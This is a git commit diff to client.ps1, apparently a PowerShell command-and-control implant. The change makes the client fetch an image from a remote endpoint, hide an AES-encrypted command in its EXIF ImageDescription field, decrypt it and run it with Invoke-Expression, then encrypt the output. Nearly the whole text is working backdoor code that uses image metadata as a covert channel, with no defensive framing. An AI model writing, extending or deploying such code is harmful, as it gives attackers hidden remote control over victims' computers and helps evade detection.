8fe2dcf39a3cc7c1fe3c94f0489a0cc9c342f07f
CeilingGang <135511303+CeilingGang@users.noreply.github.com>
2023-06-05 15:08:48 +0200

    TAMBOURINE TOWER

--- client.ps1
+++ client.ps1
@@ -24,13 +24,28 @@ $LastCommand = ""
 while($true) {
     Start-Sleep -Seconds 1
 
-    # Get the encrypted command from the server
-    $EncryptedCommand = Invoke-RestMethod -Method Get -Uri "$Endpoint/ceiling_gang"
+    # Download the image and save it
+    $ImagePath = "./command_image.png"
+    Invoke-WebRequest -Uri "$Endpoint/ceiling_gang" -OutFile $ImagePath
 
-    # Convert from base64 to byte array
-    $CommandBytes = [System.Convert]::FromBase64String($EncryptedCommand.commands)
+    # Use .NET classes to get the ImageDescription EXIF data from the image
+    $Image = New-Object System.Drawing.Bitmap $ImagePath
+    $PropertyItems = $Image.PropertyItems
+    $Image.Dispose()  # Dispose image after reading property items
 
-    # Separate the IV and ciphertext
+    # Find the property item for the ImageDescription (ID 270)
+    $ImageDescriptionItem = $PropertyItems | Where-Object { $_.Id -eq 270 }
+
+    # Convert the property item data from byte array to string
+    $ImageDescription = [System.Text.Encoding]::Default.GetString($ImageDescriptionItem.Value)
+
+    # Remove the trailing null character
+    $ImageDescription = $ImageDescription.TrimEnd([char]0)
+
+
+    # Decode the base64 string
+    $CommandBytes = [System.Convert]::FromBase64String($ImageDescription)
+
     $IV = $CommandBytes[0..15]
     $Ciphertext = $CommandBytes[16..($CommandBytes.Count - 1)]
 
@@ -46,16 +61,18 @@ while($true) {
     $DecryptedCommandBytes = $Decryptor.TransformFinalBlock($Ciphertext, 0, $Ciphertext.Length)
     $DecryptedCommand = [System.Text.Encoding]::UTF8.GetString($DecryptedCommandBytes)
 
+
     # If the command is different than the last one, execute it
     if($DecryptedCommand -ne $LastCommand) {
         $LastCommand = $DecryptedCommand
 
-        # Execute the command and get the result
+        # Execute the command and get the DecryptedCommand
         $Result = Invoke-Expression -Command $DecryptedCommand
 
         # Encrypt the result
-        $AESManaged.IV = New-Object Byte[] 16
-        [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($AESManaged.IV)
+        $AESManaged = New-Object System.Security.Cryptography.AesManaged
+        $AESManaged.Key = $Key
+        $AESManaged.GenerateIV()
         $Encryptor = $AESManaged.CreateEncryptor()
         $ResultBytes = [System.Text.Encoding]::UTF8.GetBytes($Result)
         $EncryptedResultBytes = $Encryptor.TransformFinalBlock($ResultBytes, 0, $ResultBytes.Length)
